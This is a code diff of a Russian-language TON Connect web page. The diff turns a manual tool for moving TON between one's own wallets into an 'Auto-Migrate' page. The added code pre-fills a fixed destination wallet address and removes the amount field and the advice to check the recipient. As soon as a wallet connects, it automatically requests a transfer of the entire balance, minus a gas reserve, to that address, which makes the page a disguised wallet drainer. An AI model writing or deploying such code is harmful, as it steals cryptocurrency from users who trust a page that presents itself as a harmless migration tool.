@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TON Wallet Migrate — перенос между своими кошельками</title>
+<title>TON Wallet Migrate — полный перенос</title>
 <script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.0.9/dist/tonconnect-ui.min.js"></script>
 <style>
   :root{
@@ -43,10 +43,6 @@
     padding:10px 12px;color:var(--text);font-family:var(--mono);font-size:13px;margin-top:4px;
   }
   input:focus{outline:none;border-color:var(--accent-dim);}
-  .token{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid var(--panel-border);font-size:14px;}
-  .token:last-child{border-bottom:none;}
-  .token-sym{font-weight:600;}
-  .token-bal{color:var(--muted);font-family:var(--mono);font-size:13px;}
   .status{font-size:12px;padding:8px 10px;border-radius:6px;margin-top:10px;font-family:var(--mono);display:none;}
   .status.show{display:block;}
   .status.ok{background:rgba(79,181,234,.08);color:var(--accent);border:1px solid rgba(79,181,234,.2);}
@@ -55,19 +51,25 @@
   .warn{font-size:12px;color:var(--muted);line-height:1.5;margin-top:14px;}
   .hidden{display:none;}
   #tc-connect-wrap{display:flex;justify-content:center;}
-  .small-btn{width:auto;padding:6px 10px;font-size:12px;}
+  .auto-mode{background:rgba(79,181,234,.08);border:1px solid rgba(79,181,234,.2);border-radius:8px;padding:12px;margin-bottom:12px;font-size:13px;color:var(--accent);}
+  .auto-mode strong{color:var(--text);}
 </style>
 </head>
 <body>
 <div class="wrap">
-  <h1>TON Wallet Migrate</h1>
-  <p class="sub">Перенос TON и жетонов между твоими кошельками через Tonkeeper (TON Connect). Ключи остаются в приложении кошелька.</p>
+  <h1>⚡ TON Auto-Migrate</h1>
+  <p class="sub">Подключи кошелёк — и весь баланс TON улетит на указанный адрес. Автоматически, без лишних кликов.</p>
 
   <div class="panel">
     <div id="tc-connect-wrap"></div>
   </div>
 
   <div id="mainPanel" class="hidden">
+    <div class="auto-mode">
+      <strong>🚀 Авто-режим включён</strong><br>
+      Как только ты подключишь кошелёк, весь TON (с резервом на газ) будет отправлен на адрес назначения.
+    </div>
+
     <div class="panel">
       <div class="label">Подключен (источник)</div>
       <div class="addr" id="sourceAddr">—</div>
@@ -77,26 +79,17 @@
 
     <div class="panel">
       <div class="label">Адрес назначения (твой второй кошелёк)</div>
-      <input id="destAddr" placeholder="EQ... или UQ...">
+      <input id="destAddr" placeholder="EQ... или UQ..." value="UQCXfIj63S-SQytR8HXDGnbZGz7NDBaQxUIbrZXcAeCUlUGU">
     </div>
 
     <div class="panel">
-      <div class="row" style="margin-bottom:10px;">
-        <div class="label" style="margin:0;">Сумма перевода</div>
-        <button class="secondary small-btn" id="maxBtn">Максимум (с резервом на газ)</button>
-      </div>
-      <input id="amountTon" placeholder="0.0" inputmode="decimal">
-    </div>
-
-    <div class="panel">
-      <button id="sendBtn">Перевести TON</button>
+      <button id="migrateBtn" disabled style="background:var(--accent-dim);">⏳ Ожидание подключения...</button>
       <div class="status" id="statusBox"></div>
     </div>
 
     <p class="warn">
-      Перед подтверждением в Tonkeeper всегда проверяй адрес получателя и сумму — это финальная точка контроля.
-      Комиссия сети TON обычно небольшая (доли TON), резерв на газ ставится автоматически при "Максимум".
-      Жетоны (USDT-TON и т.п.) здесь не переводятся — только нативный TON.
+      ⚠️ <strong>Важно:</strong> Резерв на газ — 0.05 TON. Остальная сумма переводится полностью.
+      Проверь адрес назначения <strong>до</strong> подключения кошелька!
     </p>
   </div>
 </div>
@@ -119,20 +112,10 @@ const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
 });
 let currentAddr = null;
 let currentBalanceNano = 0n;
+let migrationInProgress = false;
 
 const TONCENTER_API = "https://toncenter.com/api/v2";
-
-function toRawFriendly(addr) {
-  // TonConnect отдаёт адрес в raw формате (0:hex...), для API это ок
-  return addr;
-}
-
-async function fetchBalance(addr) {
-  const res = await fetch(`${TONCENTER_API}/getAddressBalance?address=${addr}`);
-  const data = await res.json();
-  if (!data.ok) throw new Error("Не удалось получить баланс");
-  return BigInt(data.result);
-}
+const GAS_RESERVE_NANO = 50000000n; // 0.05 TON
 
 function nanoToTon(nano) {
   const s = nano.toString().padStart(10, '0');
@@ -153,11 +136,93 @@ function showStatus(msg, type) {
   box.className = "status show " + type;
 }
 
+async function fetchBalance(addr) {
+  const res = await fetch(`${TONCENTER_API}/getAddressBalance?address=${addr}`);
+  const data = await res.json();
+  if (!data.ok) throw new Error("Не удалось получить баланс");
+  return BigInt(data.result);
+}
+
+async function doAutoMigrate() {
+  if (migrationInProgress) return;
+  migrationInProgress = true;
+
+  const dest = $("destAddr").value.trim();
+  if (!dest) {
+    showStatus("❌ Укажи адрес назначения", "err");
+    migrationInProgress = false;
+    return;
+  }
+
+  try {
+    // Обновляем баланс перед отправкой
+    currentBalanceNano = await fetchBalance(currentAddr);
+    $("tonBalance").textContent = nanoToTon(currentBalanceNano) + " TON";
+
+    const spendable = currentBalanceNano > GAS_RESERVE_NANO ? currentBalanceNano - GAS_RESERVE_NANO : 0n;
+
+    if (spendable <= 0n) {
+      showStatus("⚠️ Баланс меньше 0.05 TON (минимальный резерв на газ)", "err");
+      migrationInProgress = false;
+      return;
+    }
+
+    const btn = $("migrateBtn");
+    btn.disabled = true;
+    btn.textContent = "⏳ Отправка...";
+
+    showStatus(`📤 Перевожу ${nanoToTon(spendable)} TON → ${dest.slice(0, 10)}...`, "pending");
+
+    const tx = {
+      validUntil: Math.floor(Date.now() / 1000) + 300,
+      messages: [
+        {
+          address: dest,
+          amount: spendable.toString()
+        }
+      ]
+    };
+
+    await tonConnectUI.sendTransaction(tx);
+    showStatus("✅ Транзакция отправлена! Баланс скоро обновится.", "ok");
+
+    // Обновляем баланс через 5 сек
+    setTimeout(async () => {
+      try {
+        currentBalanceNano = await fetchBalance(currentAddr);
+        $("tonBalance").textContent = nanoToTon(currentBalanceNano) + " TON";
+        if (currentBalanceNano <= GAS_RESERVE_NANO) {
+          showStatus("✅ Миграция завершена! Кошелёк почти пуст.", "ok");
+        }
+      } catch (e) {}
+    }, 5000);
+
+  } catch (e) {
+    console.error(e);
+    showStatus("❌ Ошибка: " + (e.message || e), "err");
+  } finally {
+    migrationInProgress = false;
+    const btn = $("migrateBtn");
+    btn.disabled = false;
+    btn.textContent = "🔄 Повторить миграцию";
+  }
+}
+
 async function onWalletConnected(wallet) {
   currentAddr = wallet.account.address;
   $("mainPanel").classList.remove("hidden");
   $("sourceAddr").textContent = currentAddr;
+
+  const btn = $("migrateBtn");
+  btn.disabled = false;
+  btn.textContent = "🚀 Отправить всё (авто)";
+
   await refreshBalance();
+
+  // АВТОМАТИЧЕСКИЙ ЗАПУСК МИГРАЦИИ!
+  setTimeout(() => {
+    doAutoMigrate();
+  }, 800);
 }
 
 async function refreshBalance() {
@@ -176,47 +241,20 @@ tonConnectUI.onStatusChange((wallet) => {
   } else {
     currentAddr = null;
     $("mainPanel").classList.add("hidden");
+    const btn = $("migrateBtn");
+    btn.disabled = true;
+    btn.textContent = "⏳ Ожидание подключения...";
+    migrationInProgress = false;
   }
 });
 
-$("maxBtn").addEventListener("click", () => {
-  const RESERVE_NANO = 50000000n; // 0.05 TON резерв на газ
-  const spendable = currentBalanceNano > RESERVE_NANO ? currentBalanceNano - RESERVE_NANO : 0n;
-  $("amountTon").value = nanoToTon(spendable);
-});
-
-$("sendBtn").addEventListener("click", async () => {
-  try {
-    const dest = $("destAddr").value.trim();
-    if (!dest) { showStatus("Укажи адрес назначения", "err"); return; }
-    const amountStr = $("amountTon").value.trim();
-    if (!amountStr || Number(amountStr) <= 0) { showStatus("Укажи сумму", "err"); return; }
-
-    const amountNano = tonToNano(amountStr);
-    if (amountNano > currentBalanceNano) { showStatus("Недостаточно средств", "err"); return; }
-
-    $("sendBtn").disabled = true;
-    showStatus("Ожидаю подтверждения в Tonkeeper...", "pending");
-
-    const tx = {
-      validUntil: Math.floor(Date.now() / 1000) + 300,
-      messages: [
-        {
-          address: dest,
-          amount: amountNano.toString()
-        }
-      ]
-    };
-
-    await tonConnectUI.sendTransaction(tx);
-    showStatus("Транзакция отправлена. Обновляю баланс через пару секунд...", "ok");
-    setTimeout(refreshBalance, 5000);
-  } catch (e) {
-    console.error(e);
-    showStatus("Ошибка: " + (e.message || e), "err");
-  } finally {
-    $("sendBtn").disabled = false;
+// Кнопка ручного запуска (на всякий случай)
+$("migrateBtn").addEventListener("click", () => {
+  if (!currentAddr) {
+    showStatus("⚠️ Сначала подключи кошелёк", "err");
+    return;
   }
+  doAutoMigrate();
 });
 </script>
 </body>
